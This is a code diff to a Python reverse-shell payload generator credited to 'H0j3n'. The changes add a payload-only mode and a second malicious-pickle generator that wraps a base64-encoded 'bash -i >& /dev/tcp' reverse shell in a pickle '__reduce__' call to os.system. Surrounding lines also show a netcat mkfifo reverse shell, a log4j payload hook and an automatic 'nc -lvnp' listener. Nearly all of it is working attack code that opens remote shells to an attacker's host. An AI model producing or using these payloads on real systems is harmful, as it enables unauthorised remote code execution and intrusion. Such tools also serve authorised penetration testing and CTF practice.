@@ -35,7 +35,7 @@ def header():
  | |____ / /| |_) / / ____) | | | |  __/ | |
  |______/___| .__/___|_____/|_| |_|\___|_|_|
             | |
-            |_|'''+f'''\n\n{colors.CYAN}-------- [{colors.RESET} PAYLOAD AVAILABLE {colors.CYAN}] --------
+            |_| by H0j3n'''+f'''\n\n{colors.CYAN}-------- [{colors.RESET} PAYLOAD AVAILABLE {colors.CYAN}] --------
 {colors.RESET}''')
 	# Payload Listing
 	counter = 0
@@ -47,7 +47,7 @@ def header():
 			print()
 	print(f'''{colors.CYAN}
 \n{colors.CYAN}-------- [{colors.RESET} USAGE {colors.CYAN}] --------
-{colors.RESET}{colors.ORANGE}\npython3 {sys.argv[0].split("/")[-1]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py{colors.RESET}''')
+{colors.RESET}{colors.ORANGE}\npython3 {sys.argv[0].split("/")[-1]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py{colors.RESET}\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py -payload (Only Payload){colors.RESET}''')
 
 def base64gen(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
@@ -102,6 +102,20 @@ def phpemoji(ip,port):
 
 def pickle_rce(ip,port):
 	command = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port}' + ' >/tmp/f'
+	print("# Original Reverse Shell : "+command)
+	print()
+	class rce(object):
+		def __reduce__(self):
+			import os
+			return (os.system,(command,))
+	return base64.b64encode(pickle.dumps(rce()))
+
+def pickle_rce2(ip,port):
+	temp = base64gen(ip,port)
+	j = "echo {BASE64} | base64 -d | bash"
+	command = j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
+	print("# Original Reverse Shell : "+command)
+	print()
 	class rce(object):
 		def __reduce__(self):
 			import os
@@ -141,6 +155,10 @@ if __name__ == "__main__":
 	if len(sys.argv) < 4:
 		header()
 		sys.exit(-1)
+	elif len(sys.argv) == 5:
+		onlypayload = True
+	else:
+		onlypayload = False
 	#load_shell()
 	options = sys.argv[3]
 	port = sys.argv[2]
@@ -153,7 +171,12 @@ if __name__ == "__main__":
 			ip = sys.argv[1]
 		else:
 			ip = sys.argv[1]
-
+	# Check Payload
+	if options not in payload:
+		header()
+		print()
+		print(f"No such payload with this name: {options}")
+		sys.exit(-1)
 	for counter,j in enumerate(payload[options.lower()]):
 		print(f"\n{colors.CYAN}-------- [{colors.RESET} Example {counter+1} {colors.CYAN}] --------{colors.RESET}\n")
 		if "{BASE64}" in j:
@@ -188,9 +211,13 @@ if __name__ == "__main__":
 		elif "{BASE64PS1_3}" in j:
 			temp = base64gen_ps1_3(ip,port)
 			print(j.strip().replace("{BASE64PS1_3}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
-		elif "{PICKLE}" in j:
-			temp = pickle_rce(ip,port)
-			print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
+		elif ("{PICKLE}" in j) or ("{PICKLE_BASH}" in j):
+			if "{PICKLE}" in j:
+				temp = pickle_rce(ip,port)
+				print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
+			elif "{PICKLE_BASH}" in j:
+				temp = pickle_rce2(ip,port)
+				print(j.strip().replace("{PICKLE_BASH}",temp.decode("ascii")))
 		elif "{PHPEMOJI}" in j:
 			new_ip,new_port = phpemoji(ip,port)
 			print(j.strip().replace("{PHPEMOJI}","").replace("{IP}",new_ip).replace("{PORT}",new_port).strip())
@@ -207,6 +234,14 @@ if __name__ == "__main__":
 			log4j_list(ip)
 		else:
 			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
-	print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
-	os.system('nc -lvnp '+ str(port))
-	print(colors.RESET)
+	if not onlypayload:
+		print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
+		os.system('nc -lvnp '+ str(port))
+		print(colors.RESET)
+	elif sys.argv[4] != "-payload":
+		print()
+		print(f"{colors.ORANGE}[?] Did you mean -payload? {colors.RESET}")
+		print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
+		os.system('nc -lvnp '+ str(port))
+		print(colors.RESET)
+		
